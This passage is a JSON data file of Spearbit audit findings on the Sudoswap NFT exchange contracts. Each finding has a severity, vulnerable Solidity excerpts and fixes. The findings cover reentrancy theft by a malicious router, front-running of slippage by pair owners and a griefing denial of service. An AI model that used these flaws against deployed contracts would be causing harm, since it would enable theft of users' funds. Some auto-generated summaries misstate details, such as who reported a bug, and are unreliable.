        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6788",
      "title": "Check number of NFTs is not 0",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `LSSVMPair.sol#L258-310`\n- `LSSVMPair.sol#L318-366`\n- `LSSVMPair.sol#L413-431`\n\n## Description\nFunctions `swapNFTsForToken()`, `routerSwapNFTsForToken()`, and `getSellNFTQuote()` in `LSSVMPair.sol` do not perform input verification on the number of NFTs. If `_bondingCurve.getSellInfo()` accidentally happens to return a non-zero value, then an unfair amount of tokens will be given back to the caller.\n\nThe current two versions of `bondingCurve` do return 0, but a future version might accidentally return non-zero.\n\n**Note:**\n1. `getSellInfo()` is supposed to return an error when `numNFTs == 0`, but this does not always happen. This error code is not always checked.\n\n```solidity\nfunction swapNFTsForToken(uint256[] calldata nftIds, ...) external virtual returns (uint256 outputAmount) {\n    ...\n    // No check on nftIds.length\n    (error, newSpotPrice, outputAmount, protocolFee) = _bondingCurve.getSellInfo(..., nftIds.length, ..);\n    ...\n}\n```\n\n```solidity\nfunction routerSwapNFTsForToken(address payable tokenRecipient) {\n    ...\n    uint256 numNFTs = _nft.balanceOf(getAssetRecipient()) - _assetRecipientNFTBalanceAtTransferStart;\n    ...\n    // No check that numNFTs > 0\n    (error, newSpotPrice, outputAmount, protocolFee) = _bondingCurve.getSellInfo(..., numNFTs, ...);\n    ...\n}\n```\n\n```solidity\nfunction getSellNFTQuote(uint256 numNFTs) {\n    ...\n    // No check that numNFTs > 0\n    (error, newSpotPrice, outputAmount, protocolFee) = bondingCurve().getSellInfo(..., numNFTs, ...);\n    ...\n}\n```\n\n2. For comparison, the function `swapTokenForSpecificNFTs()` does perform an entry check on the number of requested NFTs.\n\n```solidity\nfunction swapTokenForSpecificNFTs(uint256[] calldata nftIds, ...) {\n    ...\n    // There is a check on the number of requested NFTs\n    require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))), \"Must ask for > 0 and < balanceOf NFTs\");\n    // check is present\n    ...\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to implement checks and make sure the number of NFTs is greater than 0.\n\nSudoswap: Added check to the `swapNFTForTokens` function here.\n\nSpearbit: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6787",
      "title": "Potentially undetected underﬂow In assembly",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n**Context:**  \nLSSVMPair.sol#L447-494, LSSVMPairERC20.sol#L24-32\n\n**Description:**  \nFunctions `factory()`, `bondingCurve()`, `nft()`, `poolType()`, and `token()` have an assembly-based calculation where the `paramsLength` is subtracted from `calldatasize()`. Assembly underflow checks are disregarded and if too few parameters are supplied in calls to the functions in the LSSVMPair contract, this calculation may underflow, resulting in the values for `factory()`, `bondingCurve()`, `nft()`, `poolType()`, and `token()` to be read from unexpected pieces of memory. This will usually be zeroed; therefore, execution will stop at some point. However, it is safer to prevent this from ever happening.\n\n```solidity\nfunction factory() public pure returns (LSSVMPairFactoryLike _factory) {\n    ...\n    assembly {_factory := shr(0x60, calldataload(sub(calldatasize(), paramsLength)))} ,!\n}\n\nfunction bondingCurve() public pure returns (ICurve _bondingCurve) {\n    ...\n    assembly {_bondingCurve := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), 20)))} ,!\n}\n\nfunction nft() public pure returns (IERC721 _nft) {\n    ...\n    assembly {_nft := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), 40)))} ,!\n}\n\nfunction poolType() public pure returns (PoolType _poolType) {\n    ...\n    assembly {_poolType := shr(0xf8, calldataload(add(sub(calldatasize(), paramsLength), 60)))} ,!\n}\n\nfunction token() public pure returns (ERC20 _token) {\n    ...\n    assembly {_token := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), 61)))} ,!\n}\n```\n\n**Recommendation:**  \nSpearbit recommends Sudoswap to implement the following changes for all functions so that an underflow will be detected at the Solidity level.\n\n```solidity\n+ uint256 offset = msg.data.length - paramsLength;\n- assembly {_token := shr(... ,calldataload(add(sub(calldatasize(), paramsLength), ...)))} ,!\n+ assembly {_token := shr(... ,calldataload(add(offset, ...)))}\n```\n\n**Sudoswap:**  \nAcknowledged, but no change for now, as we only use this pattern for the purpose of reading variables meant to be immutable, so all values are hard-coded, which makes the possibility of underflow unlikely.\n\n**Spearbit:**  \nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6786",
      "title": "Check for 0parameters",
      "impact": "LOW",
      "content": "## Security Review Report\n\n## Severity\n**Low Risk**\n\n## Context\nLSSVMPairFactory.sol#L291-356\n\n## Description\nFunctions `setCallAllowed()` and `setBondingCurveAllowed()` do not check that `target != 0` while the comparable function `setRouterAllowed()` does check for `_router != 0`.\n\n```solidity\nfunction setCallAllowed(address payable target, bool isAllowed) external\nonlyOwner { \n    // No check on target\n    callAllowed[target] = isAllowed;\n}\n\nfunction setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external\nonlyOwner { \n    // No check on bondingCurve\n    bondingCurveAllowed[bondingCurve] = isAllowed;\n}\n\nfunction setRouterAllowed(LSSVMRouter _router, bool isAllowed) external\nonlyOwner { \n    require(address(_router) != address(0), \"0 router address\");\n    routerAllowed[_router] = isAllowed;\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to consider adding a check for zero parameters in `setCallAllowed()` and `setBondingCurveAllowed()`. If zero checks are considered to be unnecessary because these functions are protected by `onlyOwner`, then the zero check could be removed from `setRouterAllowed()`.\n\n## Additional Notes\n**Sudoswap**: Removed zero address check in `setRouterAllowed` for consistency here.  \n**Spearbit**: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6785",
      "title": "Only transfer relevant funds for PoolType",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nLSSVMPairFactory.sol#L363-416\n\n## Description\nThe functions `_initializePairETH()` and `_initializePairERC20()` allow for the transfer of ETH/ERC20 and NFTs even when this is not relevant for the PoolType. Although funds can be rescued from the Pair, it is perhaps better to prevent these types of mistakes.\n\n### Function: _initializePairETH\n```solidity\nfunction _initializePairETH(...) { \n    ...\n    // Transfer initial ETH to pair \n    // Only relevant for PoolType.TOKEN or PoolType.TRADE \n    payable(address(_pair)).safeTransferETH(msg.value); \n    ... \n    // Transfer initial NFTs from sender to pair \n    for (uint256 i = 0; i < _initialNFTIDs.length; i++) { \n        // Only relevant for PoolType.NFT or PoolType.TRADE \n        _nft.safeTransferFrom(msg.sender, address(_pair), _initialNFTIDs[i]); \n    } \n} \n```\n\n### Function: _initializePairERC20\n```solidity\nfunction _initializePairERC20(...) { \n    ...\n    // Transfer initial tokens to pair \n    // Only relevant for PoolType.TOKEN or PoolType.TRADE \n    _token.safeTransferFrom(msg.sender, address(_pair), _initialTokenBalance); \n    ... \n    // Transfer initial NFTs from sender to pair \n    for (uint256 i = 0; i < _initialNFTIDs.length; i++) { \n        // Only relevant for PoolType.NFT or PoolType.TRADE \n        _nft.safeTransferFrom(msg.sender, address(_pair), _initialNFTIDs[i]); \n    } \n} \n```\n\n## Recommendation\nSpearbit recommends Sudoswap to only transfer the ETH/ERC20/NFTs that are relevant for the Pair PoolType.\n\n## Sudoswap\nAcknowledged, but no change for now. Clients will be responsible for ensuring users deposit the correct assets, and the existence of rescue functions makes it possible to correct.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6784",
      "title": "Disallow arbitrary function calls to LSSVMPairETH",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity\n**Low Risk**\n\n## Context\nLSSVMPairETH.sol#L133-139\n\n## Description\nThe contract `LSSVMPairETH` contains an open `fallback()` function. The `fallback()` is most likely necessary because the proxy adds calldata and the `receive()` function, therefore not receiving the ETH. However, without additional checks, any function call to an ETH Pair will succeed. This could result in unforeseen scenarios which hackers could potentially exploit.\n\n```solidity\nfallback() external payable {\n    emit TokenDeposited(msg.value);\n}\n```\n\n## Recommendation\nSpearbit recommends adapting the `fallback()` function in the following way to ameliorate this risk:\n\n```solidity\nfallback() external payable {\n    require(msg.data.length == _immutableParamsLength()); // only allow calls without function selector\n    emit TokenDeposited(msg.value);\n}\n```\n\n## Additional Notes\n- **Sudoswap:** Addressed here.\n- **Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6783",
      "title": "Add check for numItems == 0",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `LinearCurve.sol#L38-58`\n- `ExponentialCurve.sol#L45-65`\n- `LinearCurve.sol#L100-120`\n- `ExponentialCurve.sol#L108-129`\n\n## Description\nFunctions `getBuyInfo()` and `getSellInfo()` in `LinearCurve.sol` check that `numItems != 0`. However, the same `getBuyInfo()` and `getSellInfo()` functions in `ExponentialCurve.sol` do not perform this check.\n\n```solidity\ncontract LinearCurve is ICurve, CurveErrorCodes {\n    function getBuyInfo(...) ... {\n        // We only calculate changes for buying 1 or more NFTs\n        if (numItems == 0) {\n            return (Error.INVALID_NUMITEMS, 0, 0, 0);\n        }\n        ...\n    }\n\n    function getSellInfo(...) ... {\n        // We only calculate changes for selling 1 or more NFTs\n        if (numItems == 0) {\n            return (Error.INVALID_NUMITEMS, 0, 0, 0);\n        }\n        ...\n    }\n}\n\ncontract ExponentialCurve is ICurve, CurveErrorCodes {\n    function getBuyInfo(...) ... {\n        // No check on numItems\n        uint256 deltaPowN = delta.fpow(numItems, FixedPointMathLib.WAD);\n        ...\n    }\n\n    function getSellInfo(...) ... {\n        // No check on numItems\n        uint256 invDelta = FixedPointMathLib.WAD.fdiv(delta, FixedPointMathLib.WAD);\n        ...\n    }\n}\n```\n\nIf the code remains unchanged, an erroneous situation may not be caught, and funds might be sent when selling 0 NFTs. Luckily, when `numItems == 0`, the result `outputValue` of the functions in `ExponentialCurve` is still 0, so there is no real issue. However, it is still important to fix this because a derived version of these functions might be used by future developers.\n\n## Recommendation\nSpearbit recommends adding a check for `numItems == 0` to `getBuyInfo()` and `getSellInfo()` of `ExponentialCurve.sol`.\n\n## Responses\n- **Sudoswap:** Addressed in branch here.\n- **Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6782",
      "title": "Swaps can be front run by Pair Owner to extract any proﬁt from slippage allowance",
      "impact": "LOW",
      "content": "## Security Advisory\n\n## Severity\nLow Risk\n\n## Context\n- `LSSVMPair.sol#L630`\n- `LSSVMPair.sol#L644`\n- `LSSVMPair.sol#L660`\n\n## Description\nIf the user adds a nonzero slippage allowance, the pair owner can front-run the swap to increase the fee/spot price and steal all of the slippage allowance. This basically makes sandwich attacks much easier and cheaper to execute for the pair owner.\n\n## Recommendation\nSpearbit recommends that Sudoswap add a time delay of a few hours between the pair owner submitting a new price/fee/delta and the execution of such new changes coming into effect. If this is not ideal for Sudoswap, Spearbit alternatively recommends disallowing the change of these parameters and requiring the pair owner to deploy a new pair instead.\n\n## Responses\n**Sudoswap:** Acknowledged, but no changes have been made to the pricing model at this time. Still talking internally about what sort of time delay would be acceptable for a spot price change and how to change pricing logic if so.\n\n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6781",
      "title": "Error codes of Quote functions are unchecked",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `LSSVMPair.sol` Lines 389-431\n- `LSSVMRouter.sol`\n\n## Description\nThe error return values from functions `getBuyNFTQuote()` and `getSellNFTQuote()` are not checked in contract `LSSVMRouter.sol`, whereas other functions in contract `LSSVMPair.sol` do check for `error==CurveErrorCodes.Err` or `OK`.\n\n```solidity\nabstract contract LSSVMPair is Ownable, ReentrancyGuard {\n    ...\n    function getBuyNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) {\n        ...\n        (error, ...) = bondingCurve().getBuyInfo(...);\n    }\n\n    function getSellNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) {\n        ...\n        (error, ...) = bondingCurve().getSellInfo(...);\n    }\n\n    function swapTokenForAnyNFTs(...) external payable virtual returns (uint256 inputAmount) {\n        ...\n        (error, ...) = _bondingCurve.getBuyInfo(...);\n        require(error == CurveErrorCodes.Error.OK, \"Bonding curve error\");\n        ...\n    }\n}\n```\n\nIn `LSSVMRouter.sol` at Line 526:\n```solidity\n(, , pairOutput, ) = swapList[i].pair.getSellNFTQuote(...);\n```\n\nThe following contract lines contain the same code snippet:\n- `LSSVMRouter.sol` Lines 360, 407, 450, 493, 627, 664\n```solidity\n(, , pairCost, ) = swapList[i].pair.getBuyNFTQuote(...);\n```\n\n**Note:** The current Curve contracts, which implement the `getBuyNFTQuote()` and `getSellNFTQuote()` functions, have a limited number of potential errors. However, future Curve contracts might add additional error codes.\n\n## Recommendation\nCheck the error code of functions `getBuyNFTQuote()` and `getSellNFTQuote()` in contract `LSSVMRouter.sol`.\n\n## Responses\n- **Sudoswap:** Addressed in this branch. `LSSVMRouter` now reverts if the error is not `Error.OK` for a normal swap, or it skips performing the swap during a robust swap operation.\n- **Spearbit:** Acknowledged.",
      "summary": "\nThis bug report is related to the contracts LSSVMPair.sol and LSSVMRouter.sol. The functions getBuyNFTQuote() and getSellNFTQuote() from LSSVMPair.sol are used in several functions in LSSVMRouter.sol, but the error return values from these functions are not checked in LSSVMRouter.sol, while other functions in LSSVMPair.sol do check for error==CurveErrorCodes.Error.OK. The current Curve contracts, which implement the getBuyNFTQuote() and getSellNFTQuote() functions, have a limited number of potential errors, but future Curve contracts may add additional error codes.\n\nThe recommendation is to check the error code of functions getBuyNFTQuote() and getSellNFTQuote() in contract LSSVMRouter.sol. This issue has been addressed in a branch, and the LSSVMRouter now reverts if the Error is not Error.OK for a normal swap, or it skips performing the swap during a robust swap operation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6780",
      "title": "With NFT pools the protocol fees end up in assetRecipient instead of_factory",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- LSSVMPair.sol: Lines 192-245\n- LSSVMPairERC20.sol: Lines 90-105\n- LSSVMPairETH.sol: Lines 53-66\n\n## Description\nAssume a scenario where an NFT pool with `assetRecipient` set has the received funds sent directly to the `assetRecipient`. Now, suppose a user executes the `swapTokenForSpecificNFTs()`. \n\nThe function `_validateTokenInput()` sends the required input funds, including fees, to the `assetRecipient`. The function `_payProtocolFee()` tries to send the fees to the `_factory`. However, this function attempts to do so from the pair contract. The pair contract does not have any funds because they have been sent directly to the `assetRecipient`. As a result, after this action, the `payProtocolFee()` lowers the fees to 0 and sends this number to the `_factory`, while fees end up at `assetRecipient` instead of at the `_factory`.\n\nThe fees then end up at `assetRecipient` instead of at the `_factory`.\n\n### Notes\n- The same issue occurs in `swapTokenForAnyNFTs()`.\n- This issue occurs with both ETH and ERC20 NFT pools, although their logic is slightly different.\n- This issue occurs both when `swapTokenForSpecificNFTs()` is called directly as well as indirectly via the `LSSVMRouter`.\n- Although the pool fees are 0 with NFT pools, the factory fee is still present.\n- Luckily, TRADE pools cannot have an `assetRecipient`, as this would also create issues.\n\n```solidity\nabstract contract LSSVMPair is Ownable, ReentrancyGuard {\n    ...\n    function swapTokenForSpecificNFTs(...) external payable virtual returns (uint256 inputAmount) {\n        ...\n        _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); // sends inputAmount to assetRecipient\n        _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds);\n        _refundTokenToSender(inputAmount);\n        _payProtocolFee(_factory, protocolFee);\n        ...\n    }\n}\n```\n\n```solidity\nabstract contract LSSVMPairERC20 is LSSVMPair {\n    ...\n    function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override {\n        ...\n        uint256 pairTokenBalance = _token.balanceOf(address(this));\n        if (protocolFee > pairTokenBalance) {\n            protocolFee = pairTokenBalance;\n        }\n        _token.safeTransfer(address(_factory), protocolFee); // tries to send from the Pair contract\n    }\n}\n```\n\n```solidity\nabstract contract LSSVMPairETH is LSSVMPair {\n    function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override {\n        ...\n        uint256 pairETHBalance = address(this).balance;\n        if (protocolFee > pairETHBalance) {\n            protocolFee = pairETHBalance;\n        }\n        payable(address(_factory)).safeTransferETH(protocolFee); // tries to send from the Pair contract\n    }\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to first be aware of the following:\n- In ETH NFT pools, ETH is first sent to the Pair contract, then to other parties.\n- In ERC20 NFT pools, ERC20 tokens are sent directly from the original caller to other parties. This means that when an `assetRecipient` is set, the ERC20 does not touch the pair.\n\nSecond, we recommend that Sudoswap change `swapTokenForSpecificNFTs()` as follows:\n\n```solidity\nfunction swapTokenForSpecificNFTs(...) external payable virtual returns (uint256 inputAmount) {\n    ...\n    - _validateTokenInput(inputAmount, isRouter, routerCaller, _factory);\n    + _validateTokenInput(inputAmount - protocolFee, isRouter, routerCaller, _factory);\n    ...\n    - _payProtocolFee(_factory, protocolFee);\n    + _payProtocolFeeByOriginalCaller(_factory, protocolFee, isRouter, routerCaller);\n    ...\n}\n```\n\nWe also recommend that Sudoswap perform the same update for `swapTokenForAnyNFTs()`.\n\nThird, we recommend creating a new `_payProtocolFeeByOriginalCaller()` in `LSSVMPairERC20()` that combines the functionality of `_payProtocolFee()` and `_validateTokenInput()`. This is due to the assumption that the function should also be able to retrieve the ERC20 tokens from the original caller.\n\nNote: `_payProtocolFeeByOriginalCaller` in `LSSVMPairETH()` can just do the same as `_payProtocolFee()`.\n\nLastly, it may be wise for Sudoswap to consider renaming `_payProtocolFee()` to `_payProtocolFeeFromPair()`, clarifying the difference.\n\nNote: The functionality of `_payProtocolFeeFromPair()` is still necessary for `routerSwapNFTsForToken()` and `swapNFTsForToken()` because in that case, the funds are indeed in the Pair.\n\n## Sudoswap\nAddressed in the branch here. Pulling tokens and taking the protocol fee is now done in the same step when swapping from tokens to NFTs, so there should always be tokens to send for the fee. The original `_payProtocolFee` function has been renamed `_payProtocolFeeFromPair` as suggested.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nSudoswap is a decentralized exchange that recently reported a bug in their code. The bug occurs when a user attempts to swap tokens for specific NFTs, and the function _validateTokenInput sends the required input funds, including fees, to the assetRecipient. This causes the fees to be sent to the assetRecipient instead of the _factory. The bug occurs with both ETH and ERC20 NFT pools, and it happens both when swapTokenForSpecificNFTs is called directly or indirectly via the LSSVMRouter. \n\nSpearbit, a software testing company, recommends that Sudoswap first be aware of the following: when ETH is used in NFT pools, ETH is first sent to the Pair contract, and then to other parties; when ERC20 is used in NFT pools, ERC20 tokens are sent directly from the original caller to other parties. This means that when an assetRecipient is set, the ERC20 does not touch the pair. \n\nSecond, Spearbit recommends that Sudoswap changes swapTokenForSpecificNFTs as such: the _validateTokenInput function should subtract the protocolFee from the inputAmount, and the _payProtocolFee function should be changed to _payProtocolFeeByOriginalCaller. The same update should be performed for swapTokenForAnyNFTs. \n\nThird, Spearbit recommends creating a new _payProtocolFeeByOriginalCaller in LSSVMPairERC20 that combines the functionality of _payProtocolFee and _validateTokenInput, as this function should also be able to retrieve the ERC20 tokens from the original caller. Lastly, Spearbit suggests that Sudoswap consider renaming _payProtocolFee to _payProtocolFeeFromPair, clarifying the difference. \n\nSudoswap has addressed the bug in the branch and has renamed the _payProtocolFee function as suggested. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6779",
      "title": "getAllHeldIds() ofLSSVMPairMissingEnumerable is vulnerable to a denial of service attack",
      "impact": "MEDIUM",
      "content": "## Medium Risk Assessment\n\n## Context\n- **Files:** `LSSVMPairMissingEnumerable.sol#L90-97`, `LSSVMPair.sol#L125`\n\n## Description\nThe contract `LSSVMPairMissingEnumerable` attempts to compensate for NFT contracts that do not implement `ERC721Enumerable`. However, this compensation is not universally applicable. For instance, if `transferFrom()` is utilized to send an NFT from the same collection to the Pair, the callback on `ERC721Received()` will not be triggered. Consequently, the `idSet` administration of `LSSVMPairMissingEnumerable` will not be updated. \n\nThis discrepancy means that `nft().balanceOf(address(this));` may differ from the elements in `idSet`. If an actor inadvertently, or deliberately, uses `transferFrom()` to send additional NFTs to the Pair, the `getAllHeldIds()` function will fail since `idSet.at(i)` for unregistered NFTs will result in an error. This could facilitate a griefing attack.\n\n### `getAllHeldIds()` in `LSSVMPairMissingEnumerable`\n```solidity\nfunction getAllHeldIds() external view override returns (uint256[] memory) {\n    uint256 numNFTs = nft().balanceOf(address(this)); // returns the registered + unregistered NFTs\n    uint256[] memory ids = new uint256[](numNFTs);\n    for (uint256 i; i < numNFTs; i++) {\n        ids[i] = idSet.at(i); // will fail at the unregistered NFTs\n    }\n    return ids;\n}\n```\n\nThe checks performed with `_nft.balanceOf()` may not be accurate in conjunction with `LSSVMPairMissingEnumerable`. The risk is low because any additional NFTs causing later calls to `_sendAnyNFTsToRecipient()` and `_sendSpecificNFTsToRecipient()` will fail. Nevertheless, this may complicate troubleshooting.\n\n### `swapTokenForAnyNFTs(...)`\n```solidity\nfunction swapTokenForAnyNFTs(...) {\n    ...\n    require((numNFTs > 0) && (numNFTs <= _nft.balanceOf(address(this))), \"Ask for > 0 and <= balanceOf NFTs\");\n    ...\n    _sendAnyNFTsToRecipient(_nft, nftRecipient, numNFTs); // could fail\n    ...\n}\n```\n\n### `swapTokenForSpecificNFTs(...)`\n```solidity\nfunction swapTokenForSpecificNFTs(...) {\n    ...\n    require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))), \"Must ask for > 0 and <= balanceOf NFTs\");\n    ...\n    _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds); // could fail\n    ...\n}\n```\n\n**Note:** The error message `< balanceOf NFTs` is misleading.\n\n## Recommendation\nSpearbit recommends that Sudoswap utilize `idSet.length()` to determine the number of NFTs, by modifying the code as shown below:\n\n```diff\n- uint256 numNFTs = nft().balanceOf(address(this));\n+ uint256 numNFTs = idSet.length();\n```\n\nTo access `idSet.length()` from `LSSVMPair`, an extra function is necessary in `LSSVMPairMissingEnumerable.sol` and `LSSVMPairEnumerable.sol`. Additionally, Spearbit advises correcting the error string in `swapTokenForSpecificNFTs`.\n\n### Sudoswap\nAddressed in this branch [here](#). The `idSet` size is now utilized instead of `NFT balanceOf`.\n\n### Spearbit\nAcknowledged.",
      "summary": "\nA denial of service attack has been identified with a medium risk severity. This attack involves the contract LSSVMPairMissingEnumerable, which attempts to compensate for Non-Fungible Tokens (NFTs) that do not have ERC721Enumerable implemented. It is possible to use transferFrom() to send an NFT from the same collection to the Pair, in which case the callback on-ERC721Received() will not be triggered and the idSet administration of LSSVMPairMissingEnumerable will not be updated. This means that nft().balanceOf(address(this)) can be different from the elements in idSet. \n\nAssuming an actor accidentally, or on purpose, uses transferFrom() to send additional NFTs to the Pair, getAllHeldIds() will fail as idSet.at(i) for unregistered NFTs will fail. This can be used in a grieﬁng attack. Additionally, the checks performed by _nft.balanceOf() might not be accurate in combination with LSSVMPairMissingEnumerable. \n\nSpearbit has recommended Sudoswap to use idSet.length() in order to determine the number of NFTs by changing the code. They also suggest to fix the error string in swapTokenForSpecificNFTs. Sudoswap has addressed the issue in a branch and idSet size is now used instead of NFT balanceOf.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6778",
      "title": "Malicious Router can steal NFTs via Re-Entrancy attack",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n### Context\n- **Contracts:** `LSSVMPair.sol`, `LSSVMPairERC20.sol`\n\n### Description\nIf the factory owner approves a malicious `_router`, it is possible for the malicious router to call functions like `swapTokenForAnyNFTs()` and set `is-Router` to true. Once that function reaches `router.pairTransferERC20From()` in `validateTokenInput()`, they can re-enter the pair from the router and call `swapTokenForAnyNFTs()` again.\n\nThis second time, the function reaches `router.pairTransferERC20From()`, allowing the malicious router to execute a token transfer so that the `require` of `validateTokenInput` is satisfied when the context returns to the pair. When the context returns from the reentrant call back to the original call, the `require` of `validateTokenInput` would still pass because the balance was cached before the reentrant call. Therefore, an attacker will receive 2 NFTs by sending tokens only once.\n\n### Recommendation\nSpearbit recommends Sudoswap to implement reentrancy modifiers (see finding \"Add Reentrancy Guards\" in the \"Low Risk\" section of this report). Sudoswap should also consider checking if the NFT balance before and after `router.pairTransferERC20From()` is the same. Finally, we recommend making sure the following contracts and addresses are trusted:\n- The NFT contract\n- The ERC-20 tokens\n- The `assetRecipient`\n- The bonding curve\n- The factory\n- The factory owner\n- The `protocolFeeRecipient`\n\n### Sudoswap\nThe immediate issue is addressed in this branch. We now validate NFT balances after the `router.pairTransferERC20From` call to mitigate re-entrant balance changes by a malicious router. The broader issue of the cache function being exploitable is addressed in the GitHub Issue about simplifying the connection between the pair and the router.\n\n### Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a vulnerability in the LSSVMPair.sol and LSSVMPairERC20.sol smart contracts. If a malicious router is approved by the factory owner, they can call functions like swapTokenForAnyNFTs() and set is-Router to true. This could allow the malicious router to execute a token transfer so that the require of _validateTokenInput is satisﬁed when the context returns to the pair, allowing them to receive 2 NFTs by sending tokens only once. \n\nSudoswap, the developers of the contracts, have addressed the immediate issue by validating NFT balances after the router.pairTransferERC20From call to mitigate re-entrant balance changes by a malicious router, and they are also addressing the broader issue of the cache function being exploitable in the GitHub Issue about simplifying the connection between the pair and the router. In order to protect against this vulnerability, Spearbit recommends Sudoswap to implement reentrancy modiﬁers, check if the NFT balance before and after router.pairTransferERC20From() is the same, and make sure the following contracts and addresses are trusted: the NFT contract, the ERC-20 tokens, the assetRecipient , the bonding curve, the factory, the factory owner, and the protocolFeeRecipient . \n\nSudoswap has acknowledged the recommendation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6777",
      "title": "Malicious Router can exploit cacheAssetRecipientNFTBalance to drain pair funds",
      "impact": "MEDIUM",
